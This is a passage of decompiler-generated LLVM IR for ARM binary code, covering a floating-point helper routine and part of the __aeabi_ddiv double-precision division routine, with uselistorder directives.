  uselistorder i32 %v5_34a48, { 2, 1, 0 }
  uselistorder i32 %v12_34a3c, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 2, 5, 6, 7, 8, 9, 1, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 511, { 2, 3, 0, 1 }
  uselistorder i32 -255, { 13, 0, 4, 5, 1, 6, 7, 2, 8, 9, 3, 10, 11, 12 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_34af8, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_34ac0, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_34b28() local_unnamed_addr {
dec_label_pc_34b28:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_34b28 = load i1, i1* @cpsr_z, align 1
  %v1_34b28 = load i1, i1* @cpsr_n, align 1
  %v2_34b28 = load i1, i1* @cpsr_v, align 1
  %v3_34b28 = xor i1 %v1_34b28, %v2_34b28
  %v4_34b28 = or i1 %v0_34b28, %v3_34b28
  br i1 %v4_34b28, label %dec_label_pc_34b2c, label %dec_label_pc_34ca4

dec_label_pc_34b2c:                               ; preds = %dec_label_pc_34b28
  %v0_34b2c = load i32, i32* @r4, align 4
  %v4_34b2c = add i32 %v0_34b2c, 54
  %v6_34b2c = sub i32 0, %v0_34b2c
  %v7_34b2c = and i32 %v4_34b2c, %v6_34b2c
  %v8_34b2c = icmp slt i32 %v7_34b2c, 0
  %v9_34b2c = icmp slt i32 %v4_34b2c, 0
  %v10_34b2c = icmp eq i32 %v4_34b2c, 0
  %v7_34b30 = icmp sgt i32 %v0_34b2c, -54
  br i1 %v7_34b30, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_34b2c
  store i32 0, i32* @r0, align 4
  %v8_34b34 = load i32, i32* @r1, align 4
  %v9_34b34 = and i32 %v8_34b34, -2147483648
  store i32 %v9_34b34, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_34b2c, %bb
  %v4_34b3c = xor i1 %v9_34b2c, %v8_34b2c
  %v5_34b3c = or i1 %v10_34b2c, %v4_34b3c
  call void @__pseudo_cond_branch(i1 %v5_34b3c, i32 %tmp7)
  %v0_34b40 = load i32, i32* @r4, align 4
  %v1_34b40 = sub i32 0, %v0_34b40
  %v2_34b44 = sub i32 -32, %v0_34b40
  %v4_34b44 = add i32 %v0_34b40, 31
  %v5_34b44 = and i32 %v4_34b44, %v1_34b40
  %v6_34b44 = icmp slt i32 %v5_34b44, 0
  store i1 %v6_34b44, i1* @cpsr_v, align 1
  %v6_34b48 = icmp slt i32 %v1_34b40, 32
  br i1 %v6_34b48, label %dec_label_pc_34b4c, label %dec_label_pc_34bb8

dec_label_pc_34b4c:                               ; preds = %.thread1
  %v1_34b4c = add i32 %v2_34b44, 12
  %v8_34b50 = icmp sgt i32 %v1_34b4c, 0
  br i1 %v8_34b50, label %dec_label_pc_34b88, label %dec_label_pc_34b54

dec_label_pc_34b54:                               ; preds = %dec_label_pc_34b4c
  %v1_34b54 = add i32 %v2_34b44, 32
  %v1_34b58 = sub i32 0, %v2_34b44
  %v0_34b5c = load i32, i32* @r0, align 4
  %v6_34b5c = shl i32 %v0_34b5c, %v1_34b58
  %v2_34b60 = add i32 %v2_34b44, 31
  %v3_34b60 = shl i32 1, %v2_34b60
  %v6_34b60 = lshr i32 %v0_34b5c, %v1_34b54
  %v1_34b64 = load i32, i32* @r1, align 4
  %v7_34b64 = shl i32 %v1_34b64, %v1_34b58
  %v8_34b64 = or i32 %v7_34b64, %v6_34b60
  %v1_34b68 = and i32 %v1_34b64, -2147483648
  %tmp = bitcast i32 %v1_34b64 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_34b6c = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_34b5c, 0
  %v4_34b70 = zext i1 %tmp20 to i32
  %v5_34b70 = add i32 %v8_34b64, %v4_34b70
  %v5_34b74 = and i32 %v1_34b6c, %v3_34b60
  %v6_34b74 = icmp ne i32 %v5_34b74, 0
  %v7_34b74 = lshr i32 %v1_34b6c, %v1_34b54
  %v9_34b74 = add i32 %v7_34b74, %v1_34b68
  %v10_34b74 = zext i1 %v6_34b74 to i32
  %v11_34b74 = add i32 %v9_34b74, %v10_34b74
  store i32 %v11_34b74, i32* @r1, align 4
  %v19_34b74 = add i32 %v11_34b74, %v10_34b74
  %v20_34b74 = xor i32 %v19_34b74, %v1_34b64
  %v21_34b74 = xor i32 %v19_34b74, %v7_34b74
  %v22_34b74 = and i32 %v20_34b74, %v21_34b74
  %v23_34b74 = icmp slt i32 %v22_34b74, 0
  store i1 %v23_34b74, i1* @cpsr_v, align 1
  %v3_34b78 = mul i32 %v6_34b5c, 2
  %v4_34b78 = or i32 %v3_34b78, %tmp7
  %v5_34b78 = icmp slt i32 %v4_34b78, 0
  store i1 %v5_34b78, i1* @cpsr_n, align 1
  %v6_34b78 = icmp eq i32 %v4_34b78, 0
  store i1 %v6_34b78, i1* @cpsr_z, align 1
  br i1 %v6_34b78, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_34b54
  %tmp21 = sext i1 %tmp20 to i32
  %v6_34b7c = add nsw i32 %tmp21, -1
  %v7_34b7c = and i32 %v5_34b70, %v6_34b7c
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_34b54, %bb13
  %v1_34b84 = phi i32 [ %v5_34b70, %dec_label_pc_34b54 ], [ %v7_34b7c, %bb13 ]
  %v2_34b80 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_34b80, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_34b84

dec_label_pc_34b88:                               ; preds = %dec_label_pc_34b4c
  %v1_34b88 = sub i32 0, %v2_34b44
  %v1_34b8c = add i32 %v2_34b44, 32
  %v0_34b90 = load i32, i32* @r0, align 4
  %v6_34b90 = shl i32 %v0_34b90, %v1_34b88
  %v6_34b94 = lshr i32 %v0_34b90, %v1_34b8c
  %v1_34b98 = load i32, i32* @r1, align 4
  %v7_34b98 = shl i32 %v1_34b98, %v1_34b88
  %v8_34b98 = or i32 %v7_34b98, %v6_34b94
  %v1_34b9c = and i32 %v1_34b98, -2147483648
  %tmp22 = icmp slt i32 %v6_34b90, 0
  %v4_34ba0 = zext i1 %tmp22 to i32
  %v5_34ba0 = add i32 %v8_34b98, %v4_34ba0
  %v6_34ba0 = icmp ult i32 %v5_34ba0, %v8_34b98
  %v2_34ba4 = zext i1 %v6_34ba0 to i32
  %v3_34ba4 = or i32 %v2_34ba4, %v1_34b9c
  store i32 %v3_34ba4, i32* @r1, align 4
  %v9_34ba4 = add nsw i32 %v3_34ba4, %v2_34ba4
  %v10_34ba4 = sub i32 0, %v1_34b98
  %v11_34ba4 = and i32 %v9_34ba4, %v10_34ba4
  %v12_34ba4 = icmp slt i32 %v11_34ba4, 0
  store i1 %v12_34ba4, i1* @cpsr_v, align 1
  %v3_34ba8 = mul i32 %v6_34b90, 2
  %v4_34ba8 = or i32 %v3_34ba8, %tmp7
  %v5_34ba8 = icmp slt i32 %v4_34ba8, 0
  store i1 %v5_34ba8, i1* @cpsr_n, align 1
  %v6_34ba8 = icmp eq i32 %v4_34ba8, 0
  store i1 %v6_34ba8, i1* @cpsr_z, align 1
  br i1 %v6_34ba8, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_34b88
  %tmp23 = sext i1 %tmp22 to i32
  %v6_34bac = add nsw i32 %tmp23, -1
  %v7_34bac = and i32 %v5_34ba0, %v6_34bac
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_34b88, %bb15
  %v1_34bb4 = phi i32 [ %v5_34ba0, %dec_label_pc_34b88 ], [ %v7_34bac, %bb15 ]
  %v2_34bb0 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_34bb0, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_34bb4

dec_label_pc_34bb8:                               ; preds = %.thread1
  %v1_34bb8 = sub i32 32, %v2_34b44
  %v1_34bbc = load i32, i32* @r0, align 4
  %v7_34bbc = shl i32 %v1_34bbc, %v1_34bb8
  %v8_34bbc = or i32 %v7_34bbc, %tmp7
  %v6_34bc0 = lshr i32 %v1_34bbc, %v2_34b44
  %v1_34bc4 = load i32, i32* @r1, align 4
  %v7_34bc4 = shl i32 %v1_34bc4, %v1_34bb8
  %v8_34bc4 = or i32 %v7_34bc4, %v6_34bc0
  %v6_34bc8 = lshr i32 %v1_34bc4, %v2_34b44
  %v1_34bcc = and i32 %v1_34bc4, -2147483648
  store i32 %v1_34bcc, i32* @r1, align 4
  %v7_34bd0 = lshr i32 %v1_34bcc, %v2_34b44
  %v8_34bd0 = sub i32 -1, %v7_34bd0
  %v9_34bd0 = and i32 %v6_34bc8, %v8_34bd0
  %tmp24 = icmp slt i32 %v8_34bc4, 0
  %v4_34bd4 = zext i1 %tmp24 to i32
  %v5_34bd4 = add i32 %v4_34bd4, %v9_34bd0
  %v3_34bd8 = mul i32 %v8_34bc4, 2
  %v4_34bd8 = or i32 %v8_34bbc, %v3_34bd8
  %v5_34bd8 = icmp slt i32 %v4_34bd8, 0
  store i1 %v5_34bd8, i1* @cpsr_n, align 1
  %v6_34bd8 = icmp eq i32 %v4_34bd8, 0
  store i1 %v6_34bd8, i1* @cpsr_z, align 1
  br i1 %v6_34bd8, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_34bb8
  %tmp25 = sext i1 %tmp24 to i32
  %v6_34bdc = add nsw i32 %tmp25, -1
  %v7_34bdc = and i32 %v5_34bd4, %v6_34bdc
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_34bb8, %bb17
  %v1_34be4 = phi i32 [ %v5_34bd4, %dec_label_pc_34bb8 ], [ %v7_34bdc, %bb17 ]
  %v2_34be0 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_34be0, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_34be4

dec_label_pc_34ca4:                               ; preds = %dec_label_pc_34b28
  %v0_34ca4 = load i32, i32* @r1, align 4
  %v1_34ca4 = and i32 %v0_34ca4, -2147483648
  %v1_34cac = or i32 %v1_34ca4, 2146435072
  store i32 %v1_34cac, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_34bd4, { 1, 0 }
  uselistorder i32 %v5_34ba0, { 1, 0, 2 }
  uselistorder i32 %v8_34b98, { 1, 0 }
  uselistorder i32 %v1_34b88, { 1, 0 }
  uselistorder i32 %v5_34b70, { 1, 0 }
  uselistorder i32 %v1_34b64, { 1, 0, 2, 3 }
  uselistorder i32 %v1_34b58, { 1, 0 }
  uselistorder i32 %v2_34b44, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_34b40, { 1, 0 }
  uselistorder i32 %v4_34b2c, { 1, 2, 0 }
  uselistorder i32 %v0_34b2c, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 225, 226, 227, 228, 87, 84, 85, 231, 86, 11, 88, 89, 0, 232, 194, 200, 15, 201, 233, 52, 90, 91, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 10, 65, 66, 67, 234, 68, 69, 19, 235, 20, 236, 21, 237, 17, 238, 104, 105, 14, 229, 230, 239, 240, 241, 22, 114, 23, 24, 202, 203, 92, 93, 94, 25, 179, 204, 4, 2, 3, 205, 206, 6, 1, 5, 213, 95, 96, 97, 98, 99, 100, 101, 102, 103, 106, 107, 108, 109, 110, 111, 112, 113, 18, 279, 280, 281, 282, 283, 285, 286, 284, 287, 288, 289, 290, 291, 292, 293, 26, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 27, 195, 196, 197, 198, 199, 115, 116, 28, 117, 118, 119, 221, 222, 120, 121, 304, 305, 306, 307, 308, 309, 310, 311, 295, 296, 297, 298, 299, 300, 301, 302, 303, 8, 207, 208, 209, 210, 211, 29, 212, 256, 30, 31, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 275, 268, 269, 270, 271, 272, 273, 274, 276, 277, 32, 278, 214, 215, 122, 123, 33, 124, 7, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 216, 12, 217, 34, 35, 36, 38, 37, 39, 255, 218, 219, 40, 150, 41, 140, 13, 125, 126, 127, 223, 128, 224, 129, 130, 131, 132, 42, 80, 81, 82, 133, 134, 312, 135, 136, 137, 313, 43, 294, 138, 139, 141, 142, 83, 143, 144, 9, 146, 145, 147, 148, 149, 151, 152, 153, 154, 155, 156, 16, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 44, 171, 172, 173, 174, 45, 175, 176, 177, 46, 178, 180, 181, 182, 47, 48, 183, 184, 185, 49, 186, 187, 188, 50, 189, 190, 191, 192, 51, 193, 220 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 8, 9, 2, 10, 0, 1, 14, 11, 15, 16, 17, 12, 13 }
  uselistorder i32 54, { 3, 0, 2, 1 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_34cbc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_34cbc:
  %v1_34cc0 = or i32 %arg1, 2146959360
  store i32 %v1_34cc0, i32* @r1, align 4
  %v1_34cc8 = load i32, i32* @r0, align 4
  ret i32 %v1_34cc8
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_34ccc = load i32, i32* @r4, align 4
  store i32 %v3_34ccc, i32* %stack_var_-16, align 4
  %v6_34ccc = load i32, i32* @r5, align 4
  %v9_34ccc = load i32, i32* @r6, align 4
  %v12_34ccc = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_34cd8 = load i32, i32* @r1, align 4
  %v4_34cd8 = udiv i32 %v1_34cd8, 1048576
  %v5_34cd8 = urem i32 %v4_34cd8, 2048
  store i32 %v5_34cd8, i32* @r4, align 4
  %v6_34cd8 = icmp eq i32 %v5_34cd8, 0
  br i1 %v6_34cd8, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_34cdc = udiv i32 %arg4, 1048576
  %v6_34cdc = urem i32 %v5_34cdc, 2048
  store i32 %v6_34cdc, i32* %r5.global-to-local, align 4
  %v7_34cdc = icmp eq i32 %v6_34cdc, 0
  br i1 %v7_34cdc, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_34e68

bb90:                                             ; preds = %bb
  %v5_34ce0 = icmp eq i32 %v5_34cd8, 2047
  br i1 %v5_34ce0, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_34cdc, %bb90 ]
  br label %dec_label_pc_34e68

bb91:                                             ; preds = %bb90
  %v5_34ce4 = icmp eq i32 %v6_34cdc, 2047
  br i1 %v5_34ce4, label %dec_label_pc_34e68, label %dec_label_pc_34cec

dec_label_pc_34cec:                               ; preds = %bb91
  %v2_34cec = sub nsw i32 %v5_34cd8, %v6_34cdc
  store i32 %v2_34cec, i32* %r4.global-to-local, align 4
  %v2_34cf0 = xor i32 %v1_34cd8, %arg4
  %v4_34cf4 = mul i32 %arg4, 4096
  %v5_34cf4 = or i32 %v4_34cf4, %arg3
  store i32 %v5_34cf4, i32* %r5.global-to-local, align 4
  %v7_34cf4 = icmp eq i32 %v5_34cf4, 0
  %v3_34cf8 = mul i32 %v1_34cd8, 4096
  store i32 %v3_34cf8, i32* %r1.global-to-local, align 4
  br i1 %v7_34cf4, label %dec_label_pc_34e34, label %dec_label_pc_34d00

dec_label_pc_34d00:                               ; preds = %dec_label_pc_34cec
  %tmp92 = mul i32 %arg4, 256
  %v4_34d08 = and i32 %tmp92, 268435200
  %v4_34d0c = udiv i32 %arg3, 16777216
  %v5_34d08 = or i32 %v4_34d0c, %v4_34d08
  %v5_34d0c = or i32 %v5_34d08, 268435456
  store i32 %v5_34d0c, i32* %r3.global-to-local, align 4
  %v3_34d10 = mul i32 %arg3, 256
  store i32 %v3_34d10, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_34cd8, 256
  %v4_34d14 = and i32 %tmp93, 268435200
  %v1_34d18 = load i32, i32* @r0, align 4
  %v4_34d18 = udiv i32 %v1_34d18, 16777216
  %v5_34d14 = or i32 %v4_34d14, %v4_34d18
  %v5_34d18 = or i32 %v5_34d14, 268435456
  store i32 %v5_34d18, i32* %r5.global-to-local, align 4
  %v3_34d1c = mul i32 %v1_34d18, 256
  store i32 %v3_34d1c, i32* %r6.global-to-local, align 4
  %v1_34d20 = and i32 %v2_34cf0, -2147483648
  store i32 %v1_34d20, i32* %r1.global-to-local, align 4
  %v3_34d24 = icmp uge i32 %v5_34d18, %v5_34d0c
  %v9_34d24 = icmp eq i32 %v5_34d18, %v5_34d0c
  br i1 %v9_34d24, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_34d00
  %v4_34d28 = icmp uge i32 %v3_34d1c, %v3_34d10
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_34d00, %bb94
  %v1_34d2c = phi i1 [ %v3_34d24, %dec_label_pc_34d00 ], [ %v4_34d28, %bb94 ]
  %v2_34d2c = add nsw i32 %v2_34cec, 253
  %v3_34d2c = zext i1 %v1_34d2c to i32
  %v4_34d2c = add nsw i32 %v2_34d2c, %v3_34d2c
  %v8_34d2c = icmp ule i32 %v4_34d2c, %v2_34cec
  %v9_34d2c = icmp ugt i32 %v2_34cec, -254
  %v10_34d2c = select i1 %v1_34d2c, i1 %v8_34d2c, i1 %v9_34d2c
  %v1_34d30 = add nsw i32 %v4_34d2c, 768
  store i32 %v1_34d30, i32* %r4.global-to-local, align 4
  br i1 %v10_34d2c, label %dec_label_pc_34d40, label %dec_label_pc_34d38

dec_label_pc_34d38:                               ; preds = %bb95
  %v3_34d38 = udiv i32 %v5_34d0c, 2
  store i32 %v3_34d38, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_34d40

dec_label_pc_34d40:                               ; preds = %bb95, %dec_label_pc_34d38
  %v0_34d48 = phi i32 [ %v5_34d0c, %bb95 ], [ %v3_34d38, %dec_label_pc_34d38 ]
  %v0_34d4c = phi i32 [ %v3_34d10, %bb95 ], [ 0, %dec_label_pc_34d38 ]
  %v2_34d40 = sub i32 %v3_34d1c, %v0_34d4c
  store i32 %v2_34d40, i32* %r6.global-to-local, align 4
  %v3_34d40 = icmp uge i32 %v3_34d1c, %v0_34d4c
  %v3_34d44 = icmp eq i1 %v3_34d40, false
  %v4_34d44 = sub nsw i32 %v5_34d18, %v0_34d48
  %v6_34d44 = sext i1 %v3_34d44 to i32
  %v7_34d44 = add nsw i32 %v6_34d44, %v4_34d44
  store i32 %v7_34d44, i32* %r5.global-to-local, align 4
  %v3_34d48 = udiv i32 %v0_34d48, 2
  store i32 %v3_34d48, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_34d58.outer

dec_label_pc_34d58.outer:                         ; preds = %dec_label_pc_34df0, %dec_label_pc_34d40
  %v1_34e04.ph = phi i32 [ %v2_34df0, %dec_label_pc_34df0 ], [ %v1_34d20, %dec_label_pc_34d40 ]
  %v0_34d5c.ph = phi i32 [ %v5_34dcc, %dec_label_pc_34df0 ], [ %v7_34d44, %dec_label_pc_34d40 ]
  %v1_34d60.ph = phi i32 [ %v3_34dd0, %dec_label_pc_34df0 ], [ %v2_34d40, %dec_label_pc_34d40 ]
  %v5_34dd817.ph = phi i32 [ %v5_34dd8, %dec_label_pc_34df0 ], [ %v3_34d48, %dec_label_pc_34d40 ]
  %v3_34ddc13.ph = phi i32 [ %v3_34ddc, %dec_label_pc_34df0 ], [ 0, %dec_label_pc_34d40 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_34df0 ], [ 1048576, %dec_label_pc_34d40 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_34df0 ], [ 524288, %dec_label_pc_34d40 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_34d58

dec_label_pc_34d58:                               ; preds = %dec_label_pc_34d58.outer, %dec_label_pc_34dc8
  %v1_34dbc59 = phi i32 [ %v2_34e04, %dec_label_pc_34dc8 ], [ %storemerge133, %dec_label_pc_34d58.outer ]
  %v1_34d68 = phi i32 [ %v1_34d6832, %dec_label_pc_34dc8 ], [ %storemerge133, %dec_label_pc_34d58.outer ]
  %v1_34d8441 = phi i32 [ %v1_34d8443, %dec_label_pc_34dc8 ], [ %storemerge133, %dec_label_pc_34d58.outer ]
  %v1_34da050 = phi i32 [ %v1_34da052, %dec_label_pc_34dc8 ], [ %storemerge133, %dec_label_pc_34d58.outer ]
  %v0_34de0 = phi i32 [ %v3_34de0, %dec_label_pc_34dc8 ], [ %storemerge, %dec_label_pc_34d58.outer ]
  %v0_34d5c = phi i32 [ %v5_34dcc, %dec_label_pc_34dc8 ], [ %v0_34d5c.ph, %dec_label_pc_34d58.outer ]
  %v1_34d60 = phi i32 [ %v3_34dd0, %dec_label_pc_34dc8 ], [ %v1_34d60.ph, %dec_label_pc_34d58.outer ]
  %v5_34dd817 = phi i32 [ %v5_34dd8, %dec_label_pc_34dc8 ], [ %v5_34dd817.ph, %dec_label_pc_34d58.outer ]
  %v3_34ddc13 = phi i32 [ %v3_34ddc, %dec_label_pc_34dc8 ], [ %v3_34ddc13.ph, %dec_label_pc_34d58.outer ]
  %v3_34d58 = icmp uge i32 %v1_34d60, %v3_34ddc13
  %v3_34d5c = icmp eq i1 %v3_34d58, false
  %v4_34d5c = sub i32 %v0_34d5c, %v5_34dd817
  %v6_34d5c = sext i1 %v3_34d5c to i32
  %v7_34d5c = add i32 %v6_34d5c, %v4_34d5c
  %v8_34d5c = zext i1 %v3_34d5c to i32
  %v9_34d5c = sub i32 %v7_34d5c, %v8_34d5c
  %v10_34d5c = icmp ult i32 %v0_34d5c, %v9_34d5c
  %v11_34d5c = icmp ne i32 %v5_34dd817, -1
  %v12_34d5c = or i1 %v11_34d5c, %v10_34d5c
  %v13_34d5c = icmp ult i32 %v0_34d5c, %v5_34dd817
  %v14_34d5c = select i1 %v3_34d5c, i1 %v12_34d5c, i1 %v13_34d5c
  br i1 %v14_34d5c, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_34d58
  %v3_34d60 = sub i32 %v1_34d60, %v3_34ddc13
  store i32 %v3_34d60, i32* %r6.global-to-local, align 4
  store i32 %v7_34d5c, i32* %r5.global-to-local, align 4
  %v3_34d68 = or i32 %v1_34d68, %v0_34de0
  store i32 %v3_34d68, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_34d58, %bb96
  %v1_34dbc58 = phi i32 [ %v1_34dbc59, %dec_label_pc_34d58 ], [ %v3_34d68, %bb96 ]
  %v1_34d6835 = phi i32 [ %v1_34d68, %dec_label_pc_34d58 ], [ %v3_34d68, %bb96 ]
  %v1_34d84 = phi i32 [ %v1_34d8441, %dec_label_pc_34d58 ], [ %v3_34d68, %bb96 ]
  %v1_34da049 = phi i32 [ %v1_34da050, %dec_label_pc_34d58 ], [ %v3_34d68, %bb96 ]
  %v0_34d78 = phi i32 [ %v0_34d5c, %dec_label_pc_34d58 ], [ %v7_34d5c, %bb96 ]
  %v1_34d7c = phi i32 [ %v1_34d60, %dec_label_pc_34d58 ], [ %v3_34d60, %bb96 ]
  %v1_34d6c = urem i32 %v5_34dd817, 2
  %v2_34d6c = icmp ne i32 %v1_34d6c, 0
  %v3_34d6c = udiv i32 %v5_34dd817, 2
  %v3_34d70 = zext i1 %v2_34d6c to i32
  %v6_34d70 = zext i32 %v3_34ddc13 to i64
  %v7_34d70 = sub i32 33, %v3_34ddc13
  %v8_34d70 = zext i32 %v7_34d70 to i64
  %v9_34d70 = shl i64 %v6_34d70, %v8_34d70
  %v10_34d70 = sub i32 32, %v3_34ddc13
  %v11_34d70 = shl i32 %v3_34d70, %v10_34d70
  %v12_34d70 = zext i32 %v11_34d70 to i64
  %v14_34d70 = or i64 %v12_34d70, %v9_34d70
  %v15_34d70 = trunc i64 %v14_34d70 to i32
  %v3_34d74 = icmp uge i32 %v1_34d7c, %v15_34d70
  %v3_34d78 = icmp eq i1 %v3_34d74, false
  %v4_34d78 = sub i32 %v0_34d78, %v3_34d6c
  %v6_34d78 = sext i1 %v3_34d78 to i32
  %v7_34d78 = add i32 %v6_34d78, %v4_34d78
  %v13_34d78 = icmp ult i32 %v0_34d78, %v3_34d6c
  %v14_34d78 = or i1 %v13_34d78, %v3_34d78
  br i1 %v14_34d78, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_34d7c = sub i32 %v1_34d7c, %v15_34d70
  store i32 %v3_34d7c, i32* %r6.global-to-local, align 4
  store i32 %v7_34d78, i32* %r5.global-to-local, align 4
  %v5_34d84 = udiv i32 %v0_34de0, 2
  %v6_34d84 = or i32 %v1_34d84, %v5_34d84
  store i32 %v6_34d84, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_34dbc57 = phi i32 [ %v1_34dbc58, %.thread4 ], [ %v6_34d84, %bb97 ]
  %v1_34d6834 = phi i32 [ %v1_34d6835, %.thread4 ], [ %v6_34d84, %bb97 ]
  %v1_34d8445 = phi i32 [ %v1_34d84, %.thread4 ], [ %v6_34d84, %bb97 ]
  %v1_34da0 = phi i32 [ %v1_34da049, %.thread4 ], [ %v6_34d84, %bb97 ]
  %v0_34d94 = phi i32 [ %v0_34d78, %.thread4 ], [ %v7_34d78, %bb97 ]
  %v1_34d98 = phi i32 [ %v1_34d7c, %.thread4 ], [ %v3_34d7c, %bb97 ]
  %v1_34d88 = urem i32 %v3_34d6c, 2
  %v2_34d88 = icmp ne i32 %v1_34d88, 0
  %v3_34d88 = udiv i32 %v5_34dd817, 4
  %v3_34d8c = zext i1 %v2_34d88 to i32
  %v6_34d8c = and i64 %v14_34d70, 4294967295
  %v7_34d8c = sub i32 33, %v15_34d70
  %v8_34d8c = zext i32 %v7_34d8c to i64
  %v9_34d8c = shl i64 %v6_34d8c, %v8_34d8c
  %v10_34d8c = sub i32 32, %v15_34d70
  %v11_34d8c = shl i32 %v3_34d8c, %v10_34d8c
  %v12_34d8c = zext i32 %v11_34d8c to i64
  %v14_34d8c = or i64 %v12_34d8c, %v9_34d8c
  %v15_34d8c = trunc i64 %v14_34d8c to i32
  %v3_34d90 = icmp uge i32 %v1_34d98, %v15_34d8c
  %v3_34d94 = icmp eq i1 %v3_34d90, false
  %v4_34d94 = sub i32 %v0_34d94, %v3_34d88
  %v6_34d94 = sext i1 %v3_34d94 to i32
  %v7_34d94 = add i32 %v6_34d94, %v4_34d94
  %v13_34d94 = icmp ult i32 %v0_34d94, %v3_34d88
  %v14_34d94 = or i1 %v13_34d94, %v3_34d94
  br i1 %v14_34d94, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_34d98 = sub i32 %v1_34d98, %v15_34d8c
  store i32 %v3_34d98, i32* %r6.global-to-local, align 4
  store i32 %v7_34d94, i32* %r5.global-to-local, align 4
  %v5_34da0 = udiv i32 %v0_34de0, 4
  %v6_34da0 = or i32 %v1_34da0, %v5_34da0
  store i32 %v6_34da0, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_34dbc = phi i32 [ %v1_34dbc57, %.thread6 ], [ %v6_34da0, %bb98 ]
